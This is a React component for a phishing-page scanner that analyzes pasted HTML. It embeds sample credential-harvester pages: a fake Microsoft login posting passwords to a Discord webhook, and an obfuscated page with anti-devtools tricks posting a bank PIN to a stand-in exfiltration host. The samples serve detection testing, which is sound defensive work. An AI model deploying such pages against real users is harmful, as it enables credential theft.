import React, { useState } from 'react';
import { Code, RefreshCw, Shield, Sparkles, ArrowRight } from 'lucide-react';
import { analyzeHtml } from '../../services/htmlAnalyzer';
import { ScanResults } from './ScanResults';
import { playScanSweep, playSafePing, playWarningBlip, playDangerAlert } from '../../utils/audioEffects';

const SAMPLE_HTML = [
  {
    label: 'Discord Webhook Credential Harvester',
    desc: 'Form action directly exfiltrating passwords to Discord webhook',
    code: `<!DOCTYPE html>
<html>
<head><title>Microsoft Account Verification</title></head>
<body>
  <h2>Session Expired - Re-enter Password</h2>
  <form action="https://discord.com/api/webhooks/1209381029381/tokenXYZ" method="POST">
    <input type="text" name="email" placeholder="Corporate Email" required />
    <input type="password" name="password" placeholder="Office 365 Password" required />
    <button type="submit">Verify Identity</button>
  </form>
</body>
</html>`
  },
  {
    label: 'Obfuscated JS & Anti-DevTools Script',
    desc: 'eval(unescape(...)) payload with F12 and right-click disabling',
    code: `<!DOCTYPE html>
<html>
<head>
  <script>
    document.oncontextmenu = function() { return false; };
    document.onkeydown = function(e) { if(e.keyCode == 123) return false; };
    eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%68%31%3e%50%61%79%50%61%6c%20%4c%6f%67%69%6e%3c%2f%68%31%3e%27%29%3b'));
  </script>
</head>
<body>
  <div style="font-size:0px; opacity:0">Security clean verified genuine token</div>
  <form action="http://insecure-exfil-server.xyz/steal.php" method="POST">
    <input type="password" name="pin" placeholder="Enter Bank PIN" />
  </form>
</body>
</html>`
  },
  {
    label: 'Clean HTML5 Authentication Page',
    desc: 'Secure HTTPS POST endpoint with standard DOM',
    code: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Enterprise Single Sign-On</title>
</head>
<body>
  <div class="auth-box">
    <h1>Sign In to Corporate Portal</h1>
    <form action="https://auth.company.com/oauth/authorize" method="POST">
      <input type="email" name="user" required />
      <input type="password" name="pass" required />
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>`
  }
];

export const HtmlScanner = ({ onScanComplete, onOpenAbuse }) => {
  const [htmlInput, setHtmlInput] = useState('');
  const [scanning, setScanning] = useState(false);
  const [currentResult, setCurrentResult] = useState(null);

  const handleScan = (content) => {
    const codeToScan = (content !== undefined ? content : htmlInput).trim();
    if (!codeToScan) return;

    setScanning(true);
    setCurrentResult(null);
    playScanSweep();

    setTimeout(() => {
      const result = analyzeHtml(codeToScan);
      setCurrentResult(result);
      setScanning(false);

      if (result.threatLevel === 'malicious') playDangerAlert();
      else if (result.threatLevel === 'suspicious') playWarningBlip();
      else playSafePing();

      if (onScanComplete) onScanComplete(result);
    }, 600);
  };

  const handleLoadSample = (sampleCode) => {
    setHtmlInput(sampleCode);
    handleScan(sampleCode);
  };

  const handleClear = () => {
    setHtmlInput('');
    setCurrentResult(null);
  };

  return (
    <div className="space-y-6">
      <div className="relative glass-panel rounded-2xl p-6 overflow-hidden">
        <div className="flex items-center space-x-3 mb-4">
          <div className="p-2.5 rounded-xl bg-sky-50 dark:bg-sky-500/10 border border-sky-200 dark:border-sky-500/20 text-sky-600 dark:text-cyan-400">
            <Code className="w-5 h-5" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-slate-900 dark:text-white tracking-tight">
              HTML DOM & Script Harvester Analyzer
            </h2>
            <p className="text-xs text-slate-600 dark:text-slate-300">
              Detect deceptive form actions, Discord/Telegram webhook exfiltration, eval() obfuscators, and zero-font hidden cloaking
            </p>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleScan();
          }}
          className="space-y-4"
        >
          <textarea
            rows={7}
            value={htmlInput}
            onChange={(e) => setHtmlInput(e.target.value)}
            placeholder="Paste raw HTML source code or page DOM snippet here (e.g. <html>, <form action=...>, <script>)..."
            className="glass-input w-full p-4 rounded-xl text-xs font-mono outline-none resize-y"
          />

          <div className="flex items-center justify-between gap-3">
            <div className="text-xs text-slate-500 dark:text-slate-400 font-mono">
              {htmlInput.length > 0 ? `${htmlInput.length} bytes parsed` : 'Supports full HTML5 & script payloads'}
            </div>

            <div className="flex items-center gap-2">
              {htmlInput && (
                <button
                  type="button"
                  onClick={handleClear}
                  className="px-4 py-2.5 rounded-xl glass-card text-slate-700 dark:text-slate-300 hover:bg-slate-100 dark:hover:bg-slate-800 text-xs font-medium transition-colors cursor-pointer"
                >
                  Clear
                </button>
              )}

              <button
                type="submit"
                disabled={scanning || !htmlInput.trim()}
                className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-500 hover:to-blue-500 disabled:opacity-50 text-white font-semibold text-xs shadow-md transition-all cursor-pointer"
              >
                {scanning ? (
                  <>
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    <span>Parsing DOM Elements...</span>
                  </>
                ) : (
                  <>
                    <Shield className="w-3.5 h-3.5" />
                    <span>Analyze DOM Code</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </form>

        <div className="mt-5 pt-4 border-t border-slate-200 dark:border-white/5">
          <div className="flex items-center space-x-2 text-xs font-semibold text-slate-500 dark:text-slate-400 mb-2.5">
            <Sparkles className="w-3.5 h-3.5 text-sky-600 dark:text-cyan-400" />
            <span>Load Known Credential Harvester DOM Samples:</span>
          </div>

          <div className="flex flex-wrap gap-2">
            {SAMPLE_HTML.map((sample, idx) => (
              <button
                key={idx}
                type="button"
                onClick={() => handleLoadSample(sample.code)}
                className="flex items-center space-x-1.5 px-3 py-1.5 rounded-xl glass-card text-slate-700 dark:text-slate-300 hover:text-sky-600 dark:hover:text-cyan-300 text-xs transition-all text-left cursor-pointer"
                title={sample.desc}
              >
                <span className="w-1.5 h-1.5 rounded-full bg-sky-500 dark:bg-cyan-400"></span>
                <span className="font-medium">{sample.label}</span>
                <ArrowRight className="w-3 h-3 text-slate-400" />
              </button>
            ))}
          </div>
        </div>
      </div>

      {currentResult && !scanning && (
        <ScanResults
          result={currentResult}
          onOpenAbuse={onOpenAbuse}
        />
      )}
    </div>
  );
};
